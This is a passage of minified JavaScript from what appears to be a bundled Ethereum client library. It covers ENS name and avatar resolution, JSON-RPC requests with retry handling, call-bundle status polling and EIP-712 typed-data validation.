        return l >= 100 && l < 200 ? ["pending", l] : l >= 200 && l < 300 ? ["success", l] : l >= 300 && l < 700 ? ["failure", l] : l === "CONFIRMED" ? ["success", 200] : l === "PENDING" ? ["pending", 100] : [void 0, l]
    })();
    return {
        ...a,
        atomic: r,
        chainId: s ? Qt(s) : void 0,
        receipts: i?.map(l => ({
            ...l,
            blockNumber: Mt(l.blockNumber),
            gasUsed: Mt(l.gasUsed),
            status: Fg[l.status]
        })) ?? [],
        statusCode: u,
        status: c,
        version: o
    }
}
async function qg(e, t) {
    const {
        id: n,
        pollingInterval: r = e.pollingInterval,
        status: s = ({
            statusCode: m
        }) => m === 200 || m >= 300,
        retryCount: i = 4,
        retryDelay: o = ({
            count: m
        }) => ~~(1 << m) * 200,
        timeout: a = 6e4,
        throwOnFailure: c = !1
    } = t, u = Be(["waitForCallsStatus", e.uid, n]), {
        promise: l,
        resolve: f,
        reject: d
    } = od();
    let h;
    const b = Yn(u, {
        resolve: f,
        reject: d
    }, m => {
        const _ = bi(async () => {
            const E = S => {
                clearTimeout(h), _(), S(), b()
            };
            try {
                const S = await mc(async () => {
                    const g = await Y(e, zg, "getCallsStatus")({
                        id: n
                    });
                    if (c && g.status === "failure") throw new f9(g);
                    return g
                }, {
                    retryCount: i,
                    delay: o
                });
                if (!s(S)) return;
                E(() => m.resolve(S))
            } catch (S) {
                E(() => m.reject(S))
            }
        }, {
            interval: r,
            emitOnBegin: !0
        });
        return _
    });
    return h = a ? setTimeout(() => {
        b(), clearTimeout(h), d(new d9({
            id: n
        }))
    }, a) : void 0, await l
}
class d9 extends F {
    constructor({
        id: t
    }) {
        super(`Timed out while waiting for call bundle with id "${t}" to be confirmed.`, {
            name: "WaitForCallsStatusTimeoutError"
        })
    }
}
const o0 = 256;
let va = o0,
    Ta;

function Gg(e = 11) {
    if (!Ta || va + e > o0 * 2) {
        Ta = "", va = 0;
        for (let t = 0; t < o0; t++) Ta += (256 + Math.random() * 256 | 0).toString(16).substring(1)
    }
    return Ta.substring(va, va++ + e)
}

function Wg(e) {
    const {
        batch: t,
        chain: n,
        ccipRead: r,
        key: s = "base",
        name: i = "Base Client",
        type: o = "base"
    } = e, a = e.experimental_blockTag ?? (typeof n?.experimental_preconfirmationTime == "number" ? "pending" : void 0), c = n?.blockTime ?? 12e3, u = Math.min(Math.max(Math.floor(c / 2), 500), 4e3), l = e.pollingInterval ?? u, f = e.cacheTime ?? l, d = e.account ? Se(e.account) : void 0, {
        config: h,
        request: b,
        value: m
    } = e.transport({
        account: d,
        chain: n,
        pollingInterval: l
    }), _ = {
        ...h,
        ...m
    }, E = {
        account: d,
        batch: t,
        cacheTime: f,
        ccipRead: r,
        chain: n,
        key: s,
        name: i,
        pollingInterval: l,
        request: b,
        transport: _,
        type: o,
        uid: Gg(),
        ...a ? {
            experimental_blockTag: a
        } : {}
    };

    function S(g) {
        return p => {
            const w = p(g);
            for (const N in E) delete w[N];
            const A = {
                ...g,
                ...w
            };
            return Object.assign(A, {
                extend: S(A)
            })
        }
    }
    return Object.assign(E, {
        extend: S(E)
    })
}

function ld(e) {
    if (!(e instanceof F)) return !1;
    const t = e.walk(n => n instanceof Kn);
    return t instanceof Kn ? t.data?.errorName === "HttpError" || t.data?.errorName === "ResolverError" || t.data?.errorName === "ResolverNotContract" || t.data?.errorName === "ResolverNotFound" || t.data?.errorName === "ReverseAddressMismatch" || t.data?.errorName === "UnsupportedResolverProfile" : !1
}

function h9(e) {
    const {
        abi: t,
        data: n
    } = e, r = ei(n, 0, 4), s = t.find(i => i.type === "function" && r === Zo(Jt(i)));
    if (!s) throw new rE(r, {
        docsPath: "/docs/contract/decodeFunctionData"
    });
    return {
        functionName: s.name,
        args: "inputs" in s && s.inputs && s.inputs.length > 0 ? Jo(s.inputs, ei(n, 4)) : void 0
    }
}
const su = "/docs/contract/encodeErrorResult";

function _p(e) {
    const {
        abi: t,
        errorName: n,
        args: r
    } = e;
    let s = t[0];
    if (n) {
        const c = ps({
            abi: t,
            args: r,
            name: n
        });
        if (!c) throw new jh(n, {
            docsPath: su
        });
        s = c
    }
    if (s.type !== "error") throw new jh(void 0, {
        docsPath: su
    });
    const i = Jt(s),
        o = Zo(i);
    let a = "0x";
    if (r && r.length > 0) {
        if (!s.inputs) throw new tE(s.name, {
            docsPath: su
        });
        a = hs(s.inputs, r)
    }
    return hi([o, a])
}
const iu = "/docs/contract/encodeFunctionResult";

function p9(e) {
    const {
        abi: t,
        functionName: n,
        result: r
    } = e;
    let s = t[0];
    if (n) {
        const o = ps({
            abi: t,
            name: n
        });
        if (!o) throw new Zs(n, {
            docsPath: iu
        });
        s = o
    }
    if (s.type !== "function") throw new Zs(void 0, {
        docsPath: iu
    });
    if (!s.outputs) throw new vb(s.name, {
        docsPath: iu
    });
    const i = (() => {
        if (s.outputs.length === 0) return [];
        if (s.outputs.length === 1) return [r];
        if (Array.isArray(r)) return r;
        throw new Tb(r)
    })();
    return hs(s.outputs, i)
}
const Sl = "x-batch-gateway:true";
async function m9(e) {
    const {
        data: t,
        ccipRequest: n
    } = e, {
        args: [r]
    } = h9({
        abi: r0,
        data: t
    }), s = [], i = [];
    return await Promise.all(r.map(async (o, a) => {
        try {
            i[a] = o.urls.includes(Sl) ? await m9({
                data: o.data,
                ccipRequest: n
            }) : await n(o), s[a] = !1
        } catch (c) {
            s[a] = !0, i[a] = b9(c)
        }
    })), p9({
        abi: r0,
        functionName: "query",
        result: [s, i]
    })
}

function b9(e) {
    return e.name === "HttpRequestError" && e.status ? _p({
        abi: r0,
        errorName: "HttpError",
        args: [e.status, e.shortMessage]
    }) : _p({
        abi: [jb],
        errorName: "Error",
        args: ["shortMessage" in e ? e.shortMessage : e.message]
    })
}

function Xg(e) {
    if (e.length !== 66 || e.indexOf("[") !== 0 || e.indexOf("]") !== 65) return null;
    const t = `0x${e.slice(1,65)}`;
    return bn(t) ? t : null
}

function a0(e) {
    let t = new Uint8Array(32).fill(0);
    if (!e) return Le(t);
    const n = e.split(".");
    for (let r = n.length - 1; r >= 0; r -= 1) {
        const s = Xg(n[r]),
            i = s ? fi(s) : We(Kr(n[r]), "bytes");
        t = We(qt([t, i]), "bytes")
    }
    return Le(t)
}

function g9(e) {
    return `[${e.slice(2)}]`
}

function x9(e) {
    const t = new Uint8Array(32).fill(0);
    return e ? Xg(e) || We(Kr(e)) : Le(t)
}

function ud(e) {
    const t = e.replace(/^\.|\.$/gm, "");
    if (t.length === 0) return new Uint8Array(1);
    const n = new Uint8Array(Kr(t).byteLength + 2);
    let r = 0;
    const s = t.split(".");
    for (let i = 0; i < s.length; i++) {
        let o = Kr(s[i]);
        o.byteLength > 255 && (o = Kr(g9(x9(s[i])))), n[r] = o.length, n.set(o, r + 1), r += o.length + 1
    }
    return n.byteLength !== r + 1 ? n.slice(0, r + 1) : n
}
async function y9(e, t) {
    const {
        blockNumber: n,
        blockTag: r,
        coinType: s,
        name: i,
        gatewayUrls: o,
        strict: a
    } = t, {
        chain: c
    } = e, u = (() => {
        if (t.universalResolverAddress) return t.universalResolverAddress;
        if (!c) throw new Error("client chain not configured. universalResolverAddress is required.");
        return mi({
            blockNumber: n,
            chain: c,
            contract: "ensUniversalResolver"
        })
    })(), l = c?.ensTlds;
    if (l && !l.some(d => i.endsWith(d))) return null;
    const f = s != null ? [a0(i), BigInt(s)] : [a0(i)];
    try {
        const d = Bt({
                abi: xp,
                functionName: "addr",
                args: f
            }),
            h = {
                address: u,
                abi: Rg,
                functionName: "resolveWithGateways",
                args: [Xn(ud(i)), d, o ?? [Sl]],
                blockNumber: n,
                blockTag: r
            },
            m = await Y(e, nn, "readContract")(h);
        if (m[0] === "0x") return null;
        const _ = ms({
            abi: xp,
            args: f,
            functionName: "addr",
            data: m[0]
        });
        return _ === "0x" || xr(_) === "0x00" ? null : _
    } catch (d) {
        if (a) throw d;
        if (ld(d)) return null;
        throw d
    }
}
class w9 extends F {
    constructor({
        data: t
    }) {
        super("Unable to extract image from metadata. The metadata may be malformed or invalid.", {
            metaMessages: ["- Metadata must be a JSON object with at least an `image`, `image_url` or `image_data` property.", "", `Provided data: ${JSON.stringify(t)}`],
            name: "EnsAvatarInvalidMetadataError"
        })
    }
}
class vi extends F {
    constructor({
        reason: t
    }) {
        super(`ENS NFT avatar URI is invalid. ${t}`, {
            name: "EnsAvatarInvalidNftUriError"
        })
    }
}
class fd extends F {
    constructor({
        uri: t
    }) {
        super(`Unable to resolve ENS avatar URI "${t}". The URI may be malformed, invalid, or does not respond with a valid image.`, {
            name: "EnsAvatarUriResolutionError"
        })
    }
}
class _9 extends F {
    constructor({
        namespace: t
    }) {
        super(`ENS NFT avatar namespace "${t}" is not supported. Must be "erc721" or "erc1155".`, {
            name: "EnsAvatarUnsupportedNamespaceError"
        })
    }
}
const E9 = /(?<protocol>https?:\/\/[^/]*|ipfs:\/|ipns:\/|ar:\/)?(?<root>\/)?(?<subpath>ipfs\/|ipns\/)?(?<target>[\w\-.]+)(?<subtarget>\/.*)?/,
    v9 = /^(Qm[1-9A-HJ-NP-Za-km-z]{44,}|b[A-Za-z2-7]{58,}|B[A-Z2-7]{58,}|z[1-9A-HJ-NP-Za-km-z]{48,}|F[0-9A-F]{50,})(\/(?<target>[\w\-.]+))?(?<subtarget>\/.*)?$/,
    T9 = /^data:([a-zA-Z\-/+]*);base64,([^"].*)/,
    S9 = /^data:([a-zA-Z\-/+]*)?(;[a-zA-Z0-9].*?)?(,)/;
async function C9(e) {
    try {
        const t = await fetch(e, {
            method: "HEAD"
        });
        return t.status === 200 ? t.headers.get("content-type")?.startsWith("image/") : !1
    } catch (t) {
        return typeof t == "object" && typeof t.response < "u" || !Object.hasOwn(globalThis, "Image") ? !1 : new Promise(n => {
            const r = new Image;
            r.onload = () => {
                n(!0)
            }, r.onerror = () => {
                n(!1)
            }, r.src = e
        })
    }
}

function Ep(e, t) {
    return e ? e.endsWith("/") ? e.slice(0, -1) : e : t
}

function Kg({
    uri: e,
    gatewayUrls: t
}) {
    const n = T9.test(e);
    if (n) return {
        uri: e,
        isOnChain: !0,
        isEncoded: n
    };
    const r = Ep(t?.ipfs, "https://ipfs.io"),
        s = Ep(t?.arweave, "https://arweave.net"),
        i = e.match(E9),
        {
            protocol: o,
            subpath: a,
            target: c,
            subtarget: u = ""
        } = i?.groups || {},
        l = o === "ipns:/" || a === "ipns/",
        f = o === "ipfs:/" || a === "ipfs/" || v9.test(e);
    if (e.startsWith("http") && !l && !f) {
        let h = e;
        return t?.arweave && (h = e.replace(/https:\/\/arweave.net/g, t?.arweave)), {
            uri: h,
            isOnChain: !1,
            isEncoded: !1
        }
    }
    if ((l || f) && c) return {
        uri: `${r}/${l?"ipns":"ipfs"}/${c}${u}`,
        isOnChain: !1,
        isEncoded: !1
    };
    if (o === "ar:/" && c) return {
        uri: `${s}/${c}${u||""}`,
        isOnChain: !1,
        isEncoded: !1
    };
    let d = e.replace(S9, "");
    if (d.startsWith("<svg") && (d = `data:image/svg+xml;base64,${btoa(d)}`), d.startsWith("data:") || d.startsWith("{")) return {
        uri: d,
        isOnChain: !0,
        isEncoded: !1
    };
    throw new fd({
        uri: e
    })
}

function Zg(e) {
    if (typeof e != "object" || !("image" in e) && !("image_url" in e) && !("image_data" in e)) throw new w9({
        data: e
    });
    return e.image || e.image_url || e.image_data
}
async function I9({
    gatewayUrls: e,
    uri: t
}) {
    try {
        const n = await fetch(t).then(s => s.json());
        return await dd({
            gatewayUrls: e,
            uri: Zg(n)
        })
    } catch {
        throw new fd({
            uri: t
        })
    }
}
async function dd({
    gatewayUrls: e,
    uri: t
}) {
    const {
        uri: n,
        isOnChain: r
    } = Kg({
        uri: t,
        gatewayUrls: e
    });
    if (r || await C9(n)) return n;
    throw new fd({
        uri: t
    })
}

function A9(e) {
    let t = e;
    t.startsWith("did:nft:") && (t = t.replace("did:nft:", "").replace(/_/g, "/"));
    const [n, r, s] = t.split("/"), [i, o] = n.split(":"), [a, c] = r.split(":");
    if (!i || i.toLowerCase() !== "eip155") throw new vi({
        reason: "Only EIP-155 supported"
    });
    if (!o) throw new vi({
        reason: "Chain ID not found"
    });
    if (!c) throw new vi({
        reason: "Contract address not found"
    });
    if (!s) throw new vi({
        reason: "Token ID not found"
    });
    if (!a) throw new vi({
        reason: "ERC namespace not found"
    });
    return {
        chainID: Number.parseInt(o, 10),
        namespace: a.toLowerCase(),
        contractAddress: c,
        tokenID: s
    }
}
async function N9(e, {
    nft: t
}) {
    if (t.namespace === "erc721") return nn(e, {
        address: t.contractAddress,
        abi: [{
            name: "tokenURI",
            type: "function",
            stateMutability: "view",
            inputs: [{
                name: "tokenId",
                type: "uint256"
            }],
            outputs: [{
                name: "",
                type: "string"
            }]
        }],
        functionName: "tokenURI",
        args: [BigInt(t.tokenID)]
    });
    if (t.namespace === "erc1155") return nn(e, {
        address: t.contractAddress,
        abi: [{
            name: "uri",
            type: "function",
            stateMutability: "view",
            inputs: [{
                name: "_id",
                type: "uint256"
            }],
            outputs: [{
                name: "",
                type: "string"
            }]
        }],
        functionName: "uri",
        args: [BigInt(t.tokenID)]
    });
    throw new _9({
        namespace: t.namespace
    })
}
async function P9(e, {
    gatewayUrls: t,
    record: n
}) {
    return /eip155:/i.test(n) ? O9(e, {
        gatewayUrls: t,
        record: n
    }) : dd({
        uri: n,
        gatewayUrls: t
    })
}
async function O9(e, {
    gatewayUrls: t,
    record: n
}) {
    const r = A9(n),
        s = await N9(e, {
            nft: r
        }),
        {
            uri: i,
            isOnChain: o,
            isEncoded: a
        } = Kg({
            uri: s,
            gatewayUrls: t
        });
    if (o && (i.includes("data:application/json;base64,") || i.startsWith("{"))) {
        const u = a ? atob(i.replace("data:application/json;base64,", "")) : i,
            l = JSON.parse(u);
        return dd({
            uri: Zg(l),
            gatewayUrls: t
        })
    }
    let c = r.tokenID;
    return r.namespace === "erc1155" && (c = c.replace("0x", "").padStart(64, "0")), I9({
        gatewayUrls: t,
        uri: i.replace(/(?:0x)?{id}/, c)
    })
}
async function Yg(e, t) {
    const {
        blockNumber: n,
        blockTag: r,
        key: s,
        name: i,
        gatewayUrls: o,
        strict: a
    } = t, {
        chain: c
    } = e, u = (() => {
        if (t.universalResolverAddress) return t.universalResolverAddress;
        if (!c) throw new Error("client chain not configured. universalResolverAddress is required.");
        return mi({
            blockNumber: n,
            chain: c,
            contract: "ensUniversalResolver"
        })
    })(), l = c?.ensTlds;
    if (l && !l.some(f => i.endsWith(f))) return null;
    try {
        const f = {
                address: u,
                abi: Rg,
                args: [Xn(ud(i)), Bt({
                    abi: gp,
                    functionName: "text",
                    args: [a0(i), s]
                }), o ?? [Sl]],
                functionName: "resolveWithGateways",
                blockNumber: n,
                blockTag: r
            },
            h = await Y(e, nn, "readContract")(f);
        if (h[0] === "0x") return null;
        const b = ms({
            abi: gp,
            functionName: "text",
            data: h[0]
        });
        return b === "" ? null : b
    } catch (f) {
        if (a) throw f;
        if (ld(f)) return null;
        throw f
    }
}
async function R9(e, {
    blockNumber: t,
    blockTag: n,
    assetGatewayUrls: r,
    name: s,
    gatewayUrls: i,
    strict: o,
    universalResolverAddress: a
}) {
    const c = await Y(e, Yg, "getEnsText")({
        blockNumber: t,
        blockTag: n,
        key: "avatar",
        name: s,
        universalResolverAddress: a,
        gatewayUrls: i,
        strict: o
    });
    if (!c) return null;
    try {
        return await P9(e, {
            record: c,
            gatewayUrls: r
        })
    } catch {
        return null
    }
}
async function M9(e, t) {
    const {
        address: n,
        blockNumber: r,
        blockTag: s,
        coinType: i = 60n,
        gatewayUrls: o,
        strict: a
    } = t, {
        chain: c
    } = e, u = (() => {
        if (t.universalResolverAddress) return t.universalResolverAddress;
        if (!c) throw new Error("client chain not configured. universalResolverAddress is required.");
        return mi({
            blockNumber: r,
            chain: c,
            contract: "ensUniversalResolver"
        })
    })();
    try {
        const l = {
                address: u,
                abi: Wv,
                args: [n, i, o ?? [Sl]],
                functionName: "reverseWithGateways",
                blockNumber: r,
                blockTag: s
            },
            f = Y(e, nn, "readContract"),
            [d] = await f(l);
        return d || null
    } catch (l) {
        if (a) throw l;
        if (ld(l)) return null;
        throw l
    }
}
async function k9(e, t) {
    const {
        blockNumber: n,
        blockTag: r,
        name: s
    } = t, {
        chain: i
    } = e, o = (() => {
        if (t.universalResolverAddress) return t.universalResolverAddress;
        if (!i) throw new Error("client chain not configured. universalResolverAddress is required.");
        return mi({
            blockNumber: n,
            chain: i,
            contract: "ensUniversalResolver"
        })
    })(), a = i?.ensTlds;
    if (a && !a.some(u => s.endsWith(u))) throw new Error(`${s} is not a valid ENS TLD (${a?.join(", ")}) for chain "${i.name}" (id: ${i.id}).`);
    const [c] = await Y(e, nn, "readContract")({
        address: o,
        abi: [{
            inputs: [{
                type: "bytes"
            }],
            name: "findResolver",
            outputs: [{
                type: "address"
            }, {
                type: "bytes32"
            }, {
                type: "uint256"
            }],
            stateMutability: "view",
            type: "function"
        }],
        functionName: "findResolver",
        args: [Xn(ud(s))],
        blockNumber: n,
        blockTag: r
    });
    return c
}
async function Jg(e, t) {
    const {
        account: n = e.account,
        blockNumber: r,
        blockTag: s = "latest",
        blobs: i,
        data: o,
        gas: a,
        gasPrice: c,
        maxFeePerBlobGas: u,
        maxFeePerGas: l,
        maxPriorityFeePerGas: f,
        to: d,
        value: h,
        ...b
    } = t, m = n ? Se(n) : void 0;
    try {
        nr(t);
        const E = (typeof r == "bigint" ? J(r) : void 0) || s,
            S = e.chain?.formatters?.transactionRequest?.format,
            p = (S || Cr)({
                ...pi(b, {
                    format: S
                }),
                account: m,
                blobs: i,
                data: o,
                gas: a,
                gasPrice: c,
                maxFeePerBlobGas: u,
                maxFeePerGas: l,
                maxPriorityFeePerGas: f,
                to: d,
                value: h
            }, "createAccessList"),
            w = await e.request({
                method: "eth_createAccessList",
                params: [p, E]
            });
        return {
            accessList: w.accessList,
            gasUsed: BigInt(w.gasUsed)
        }
    } catch (_) {
        throw Lg(_, {
            ...t,
            account: m,
            chain: e.chain
        })
    }
}
async function B9(e) {
    const t = dl(e, {
            method: "eth_newBlockFilter"
        }),
        n = await e.request({
            method: "eth_newBlockFilter"
        });
    return {
        id: n,
        request: t(n),
        type: "block"
    }
}
async function Qg(e, {
    address: t,
    args: n,
    event: r,
    events: s,
    fromBlock: i,
    strict: o,
    toBlock: a
} = {}) {
    const c = s ?? (r ? [r] : void 0),
        u = dl(e, {
            method: "eth_newFilter"
        });
    let l = [];
    c && (l = [c.flatMap(h => Yo({
        abi: [h],
        eventName: h.name,
        args: n
    }))], r && (l = l[0]));
    const f = await e.request({
        method: "eth_newFilter",
        params: [{
            address: t,
            fromBlock: typeof i == "bigint" ? J(i) : i,
            toBlock: typeof a == "bigint" ? J(a) : a,
            ...l.length ? {
                topics: l
            } : {}
        }]
    });
    return {
        abi: c,
        args: n,
        eventName: r ? r.name : void 0,
        fromBlock: i,
        id: f,
        request: u(f),
        strict: !!o,
        toBlock: a,
        type: "event"
    }
}
async function ex(e) {
    const t = dl(e, {
            method: "eth_newPendingTransactionFilter"
        }),
        n = await e.request({
            method: "eth_newPendingTransactionFilter"
        });
    return {
        id: n,
        request: t(n),
        type: "transaction"
    }
}
async function L9(e, {
    address: t,
    blockNumber: n,
    blockTag: r = e.experimental_blockTag ?? "latest"
}) {
    const s = typeof n == "bigint" ? J(n) : void 0,
        i = await e.request({
            method: "eth_getBalance",
            params: [t, s || r]
        });
    return BigInt(i)
}
async function $9(e) {
    const t = await e.request({
        method: "eth_blobBaseFee"
    });
    return BigInt(t)
}
async function D9(e, {
    blockHash: t,
    blockNumber: n,
    blockTag: r = "latest"
} = {}) {
    const s = n !== void 0 ? J(n) : void 0;
    let i;
    return t ? i = await e.request({
        method: "eth_getBlockTransactionCountByHash",
        params: [t]
    }, {
        dedupe: !0
    }) : i = await e.request({
        method: "eth_getBlockTransactionCountByNumber",
        params: [s || r]
    }, {
        dedupe: !!s
    }), Qt(i)
}
async function c0(e, {
    address: t,
    blockNumber: n,
    blockTag: r = "latest"
}) {
    const s = n !== void 0 ? J(n) : void 0,
        i = await e.request({
            method: "eth_getCode",
            params: [t, s || r]
        }, {
            dedupe: !!s
        });
    if (i !== "0x") return i
}
class F9 extends F {
    constructor({
        address: t
    }) {
        super(`No EIP-712 domain found on contract "${t}".`, {
            metaMessages: ["Ensure that:", `- The contract is deployed at the address "${t}".`, "- `eip712Domain()` function exists on the contract.", "- `eip712Domain()` function matches signature to ERC-5267 specification."],
            name: "Eip712DomainNotFoundError"
        })
    }
}
async function U9(e, t) {
    const {
        address: n,
        factory: r,
        factoryData: s
    } = t;
    try {
        const [i, o, a, c, u, l, f] = await Y(e, nn, "readContract")({
            abi: V9,
            address: n,
            functionName: "eip712Domain",
            factory: r,
            factoryData: s
        });
        return {
            domain: {
                name: o,
                version: a,
                chainId: Number(c),
                verifyingContract: u,
                salt: l
            },
            extensions: f,
            fields: i
        }
    } catch (i) {
        const o = i;
        throw o.name === "ContractFunctionExecutionError" && o.cause.name === "ContractFunctionZeroDataError" ? new F9({
            address: n
        }) : o
    }
}
const V9 = [{
    inputs: [],
    name: "eip712Domain",
    outputs: [{
        name: "fields",
        type: "bytes1"
    }, {
        name: "name",
        type: "string"
    }, {
        name: "version",
        type: "string"
    }, {
        name: "chainId",
        type: "uint256"
    }, {
        name: "verifyingContract",
        type: "address"
    }, {
        name: "salt",
        type: "bytes32"
    }, {
        name: "extensions",
        type: "uint256[]"
    }],
    stateMutability: "view",
    type: "function"
}];

function H9(e) {
    return {
        baseFeePerGas: e.baseFeePerGas.map(t => BigInt(t)),
        gasUsedRatio: e.gasUsedRatio,
        oldestBlock: BigInt(e.oldestBlock),
        reward: e.reward?.map(t => t.map(n => BigInt(n)))
    }
}
async function j9(e, {
    blockCount: t,
    blockNumber: n,
    blockTag: r = "latest",
    rewardPercentiles: s
}) {
    const i = typeof n == "bigint" ? J(n) : void 0,
        o = await e.request({
            method: "eth_feeHistory",
            params: [J(t), i || r, s]
        }, {
            dedupe: !!i
        });
    return H9(o)
}
async function z9(e, {
    filter: t
}) {
    const n = t.strict ?? !1,
        s = (await t.request({
            method: "eth_getFilterLogs",
            params: [t.id]
        })).map(i => Zn(i));
    return t.abi ? Qf({
        abi: t.abi,
        logs: s,
        strict: n
    }) : s
}
async function q9({
    address: e,
    authorization: t,
    signature: n
}) {
    return na(Lf(e), await pl({
        authorization: t,
        signature: n
    }))
}
const Sa = new di(8192);

function G9(e, {
    enabled: t = !0,
    id: n
}) {
    if (!t || !n) return e();
    if (Sa.get(n)) return Sa.get(n);
    const r = e().finally(() => Sa.delete(n));
    return Sa.set(n, r), r
}

function W9(e, t = {}) {
    return async (n, r = {}) => {
        const {
            dedupe: s = !1,
            methods: i,
            retryDelay: o = 150,
            retryCount: a = 3,
            uid: c
        } = {
            ...t,
            ...r
        }, {
            method: u
        } = n;
        if (i?.exclude?.includes(u)) throw new Fr(new Error("method not supported"), {
            method: u
        });
        if (i?.include && !i.include.includes(u)) throw new Fr(new Error("method not supported"), {
            method: u
        });
        const l = s ? Ys(`${c}.${Be(n)}`) : void 0;
        return G9(() => mc(async () => {
            try {
                return await e(n)
            } catch (f) {
                const d = f;
                switch (d.code) {
                    case lo.code:
                        throw new lo(d);
                    case uo.code:
                        throw new uo(d);
                    case fo.code:
                        throw new fo(d, {
                            method: n.method
                        });
                    case ho.code:
                        throw new ho(d);
                    case is.code:
                        throw new is(d);
                    case Er.code:
                        throw new Er(d);
                    case po.code:
                        throw new po(d);
                    case mo.code:
                        throw new mo(d);
                    case bo.code:
                        throw new bo(d);
                    case Fr.code:
                        throw new Fr(d, {
                            method: n.method
                        });
                    case ti.code:
                        throw new ti(d);
                    case go.code:
                        throw new go(d);
                    case Ls.code:
                        throw new Ls(d);
                    case xo.code:
                        throw new xo(d);
                    case yo.code:
                        throw new yo(d);
                    case wo.code:
                        throw new wo(d);
                    case _o.code:
                        throw new _o(d);
                    case Eo.code:
                        throw new Eo(d);
                    case ni.code:
                        throw new ni(d);
                    case vo.code:
                        throw new vo(d);
                    case To.code:
                        throw new To(d);
                    case So.code:
                        throw new So(d);
                    case Co.code:
                        throw new Co(d);
                    case Io.code:
                        throw new Io(d);
                    case ri.code:
                        throw new ri(d);
                    case 5e3:
                        throw new Ls(d);
                    default:
                        throw f instanceof F ? f : new R4(d)
                }
            }
        }, {
            delay: ({
                count: f,
                error: d
            }) => {
                if (d && d instanceof Hi) {
                    const h = d?.headers?.get("Retry-After");
                    if (h?.match(/\d/)) return Number.parseInt(h, 10) * 1e3
                }
                return ~~(1 << f) * o
            },
            retryCount: a,
            shouldRetry: ({
                error: f
            }) => X9(f)
        }), {
            enabled: s,
            id: l
        })
    }
}

function X9(e) {
    return "code" in e && typeof e.code == "number" ? e.code === -1 || e.code === ti.code || e.code === is.code : e instanceof Hi && e.status ? e.status === 403 || e.status === 408 || e.status === 413 || e.status === 429 || e.status === 500 || e.status === 502 || e.status === 503 || e.status === 504 : !0
}

function K9(e) {
    return {
        formatters: void 0,
        fees: void 0,
        serializers: void 0,
        ...e
    }
}

function Z9(e, {
    errorInstance: t = new Error("timed out"),
    timeout: n,
    signal: r
}) {
    return new Promise((s, i) => {
        (async () => {
            let o;
            try {
                const a = new AbortController;
                n > 0 && (o = setTimeout(() => {
                    r && a.abort()
                }, n)), s(await e({
                    signal: a?.signal || null
                }))
            } catch (a) {
                a?.name === "AbortError" && i(t), i(a)
            } finally {
                clearTimeout(o)
            }
        })()
    })
}

function Y9() {
    return {
        current: 0,
        take() {
            return this.current++
        },
        reset() {
            this.current = 0
        }
    }
}
const vp = Y9();

function J9(e, t = {}) {
    return {
        async request(n) {
            const {
                body: r,
                fetchFn: s = t.fetchFn ?? fetch,
                onRequest: i = t.onRequest,
                onResponse: o = t.onResponse,
                timeout: a = t.timeout ?? 1e4
            } = n, c = {
                ...t.fetchOptions ?? {},
                ...n.fetchOptions ?? {}
            }, {
                headers: u,
                method: l,
                signal: f
            } = c;
            try {
                const d = await Z9(async ({
                    signal: b
                }) => {
                    const m = {
                            ...c,
                            body: Array.isArray(r) ? Be(r.map(g => ({
                                jsonrpc: "2.0",
                                id: g.id ?? vp.take(),
                                ...g
                            }))) : Be({
                                jsonrpc: "2.0",
                                id: r.id ?? vp.take(),
                                ...r
                            }),
                            headers: {
                                "Content-Type": "application/json",
                                ...u
                            },
                            method: l || "POST",
                            signal: f || (a > 0 ? b : null)
                        },
                        _ = new Request(e, m),
                        E = await i?.(_, m) ?? {
                            ...m,
                            url: e
                        };
                    return await s(E.url ?? e, E)
                }, {
                    errorInstance: new rp({
                        body: r,
                        url: e
                    }),
                    timeout: a,
                    signal: !0
                });
                o && await o(d);
                let h;
                if (d.headers.get("Content-Type")?.startsWith("application/json")) h = await d.json();
                else {
                    h = await d.text();
                    try {
                        h = JSON.parse(h || "{}")
                    } catch (b) {
                        if (d.ok) throw b;
                        h = {
                            error: h
                        }
                    }
                }
                if (!d.ok) throw new Hi({
                    body: r,
                    details: Be(h.error) || d.statusText,
                    headers: d.headers,
                    status: d.status,
                    url: e
                });
                return h
            } catch (d) {
                throw d instanceof Hi || d instanceof rp ? d : new Hi({
                    body: r,
                    cause: d,
                    url: e
                })
            }
        }
    }
}
const Q9 = `Ethereum Signed Message:
`;

function eT(e) {
    const t = typeof e == "string" ? Ys(e) : typeof e.raw == "string" ? e.raw : Le(e.raw),
        n = Ys(`${Q9}${Ie(t)}`);
    return qt([n, t])
}

function tx(e, t) {
    return We(eT(e), t)
}
class tT extends F {
    constructor({
        domain: t
    }) {
        super(`Invalid domain "${Be(t)}".`, {
            metaMessages: ["Must be a valid EIP-712 domain."]
        })
    }
}
class nT extends F {
    constructor({
        primaryType: t,
        types: n
    }) {
        super(`Invalid primary type \`${t}\` must be one of \`${JSON.stringify(Object.keys(n))}\`.`, {
            docsPath: "/api/glossary/Errors#typeddatainvalidprimarytypeerror",
            metaMessages: ["Check that the primary type is a key in `types`."]
        })
    }
}
class rT extends F {
    constructor({
        type: t
    }) {
        super(`Struct type "${t}" is invalid.`, {
            metaMessages: ["Struct type must not be a Solidity type."],
            name: "InvalidStructTypeError"
        })
    }
}

function sT(e) {
    const {
        domain: t,
        message: n,
        primaryType: r,
        types: s
    } = e, i = (c, u) => {
        const l = {
            ...u
        };
        for (const f of c) {
            const {
                name: d,
                type: h
            } = f;
            h === "address" && (l[d] = l[d].toLowerCase())
        }
        return l
    }, o = s.EIP712Domain ? t ? i(s.EIP712Domain, t) : {} : {}, a = (() => {
        if (r !== "EIP712Domain") return i(s[r], n)
    })();
    return Be({
        domain: o,
        message: a,
        primaryType: r,
        types: s
    })
}

function nx(e) {
    const {
        domain: t,
        message: n,
        primaryType: r,
        types: s
    } = e, i = (o, a) => {
        for (const c of o) {
            const {
                name: u,
                type: l
            } = c, f = a[u], d = l.match(Ub);
            if (d && (typeof f == "number" || typeof f == "bigint")) {
                const [m, _, E] = d;
                J(f, {
                    signed: _ === "int",
                    size: Number.parseInt(E, 10) / 8
                })
            }
            if (l === "address" && typeof f == "string" && !zt(f)) throw new _r({
                address: f
            });
            const h = l.match(ZE);
            if (h) {
                const [m, _] = h;
                if (_ && Ie(f) !== Number.parseInt(_, 10)) throw new iE({
                    expectedSize: Number.parseInt(_, 10),
                    givenSize: Ie(f)
                })
            }
            const b = s[l];
            b && (iT(l), i(b, f))
        }
    };
    if (s.EIP712Domain && t) {
        if (typeof t != "object") throw new tT({
            domain: t
        });
        i(s.EIP712Domain, t)
    }
    if (r !== "EIP712Domain")
        if (s[r]) i(s[r], n);
        else throw new nT({
            primaryType: r,
            types: s
        })
}

function rx({
    domain: e
}) {
    return [typeof e?.name == "string" && {
        name: "name",
        type: "string"
    }, e?.version && {
